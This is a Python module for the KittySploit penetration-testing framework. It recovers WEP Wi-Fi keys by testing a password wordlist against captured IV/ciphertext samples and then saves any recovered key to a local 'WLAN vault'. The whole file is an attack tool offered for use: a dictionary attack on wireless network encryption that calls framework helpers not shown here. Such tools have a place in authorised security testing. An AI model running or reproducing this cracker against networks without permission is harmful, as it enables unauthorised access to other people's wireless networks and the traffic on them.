#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WEP key recovery from IV JSON via wordlist (5/13 byte keys)."""

from __future__ import annotations
from pathlib import Path
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WEP CPU Cracker",
        "description": (
            "Test wordlist keys against captured WEP IV/ciphertext pairs "
            "(from wep_iv_collect JSON). No aircrack-ng."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "wep", "crack"],
        "references": ["https://attack.mitre.org/techniques/T1110.002/"],
    }

    iv_file = OptFile("", "IV JSON from wep_iv_collect", required=True)
    wordlist = OptFile("", "Password / key wordlist", required=True)
    len_128 = OptBool(False, "Expect 128-bit WEP (13-byte key)", required=False)
    store_vault = OptBool(True, "Save recovered key to WLAN vault", required=False)
    ssid = OptString("", "SSID for vault entry", required=False)
    bssid = OptString("", "BSSID for vault entry", required=False)

    def check(self):
        iv = str(self.iv_file or "").strip()
        wl = str(self.wordlist or "").strip()
        if not Path(iv).is_file():
            print_error("IV_FILE missing")
            return False
        if not Path(wl).is_file():
            print_error("WORDLIST missing")
            return False
        return True

    def run(self):
        store = self.wlan_wep_load_json(str(self.iv_file))
        if not store.count:
            print_error("No IV samples in file")
            return False

        passwords = list(self.wlan_iter_wordlist(str(self.wordlist)))
        print_info(f"Testing {len(passwords)} candidates on {store.count} IV(s)")

        def progress(n: int, current: str) -> None:
            if n % 500 == 0:
                print_status(f"Tried {n} (now {current[:24]})")

        key = self.wlan_wep_crack_samples(
            store, passwords, len_128=bool(self.len_128), on_progress=progress
        )
        if not key:
            print_warning("No key matched")
            return False

        print_success(f"WEP key: {key}")
        if bool(self.store_vault):
            ssid = str(self.ssid or "").strip() or "wep-net"
            bssid = str(self.bssid or "").strip().lower()
            if not bssid and store.samples:
                bssid = store.samples[0].bssid
            self.wlan_vault_store(
                ssid=ssid,
                bssid=bssid,
                secret_type="wep",
                secret=key,
                notes=str(self.iv_file),
            )
            print_success("Stored in local WLAN vault")
        return True